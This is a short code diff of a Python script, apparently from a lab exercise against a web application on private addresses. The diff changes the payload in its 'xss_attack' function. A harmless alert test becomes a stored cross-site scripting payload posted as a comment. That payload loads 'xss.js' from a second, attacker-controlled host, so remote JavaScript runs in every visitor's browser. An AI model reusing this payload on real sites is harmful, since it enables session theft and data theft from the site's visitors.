@@ -10,7 +10,7 @@ import  requests
 
 def xss_attack():
 	uri= "http://172.16.113.150/post_comment.php?id=2"
-	payload ={'title':'Confuse', 'author':'nyanyi','text':'<script>alert(6)</script>','submit':'submit'}
+	payload ={'title':'Confuse', 'author':'nyanyi','text':'<script src="http://172.16.113.48:9090/xss.js"></script>','submit':'submit'}
 	r=requests.post(uri, data=payload)
 	print("xss attack")
 	
